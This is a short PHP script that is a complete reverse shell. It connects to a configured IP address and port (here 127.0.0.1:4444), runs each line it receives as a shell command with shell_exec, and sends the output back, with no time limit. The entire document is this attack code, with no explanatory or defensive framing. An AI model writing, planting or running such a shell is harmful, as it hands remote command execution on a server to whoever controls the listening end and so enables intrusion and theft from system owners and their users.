<?php
set_time_limit(0);
$ip = '127.0.0.1';
$port = 4444;
$sock = fsockopen($ip, $port);
while(!feof($sock)) {
    $command = fgets($sock, 1024);
    $output = shell_exec($command);
    fwrite($sock, $output);
}
fclose($sock);
?>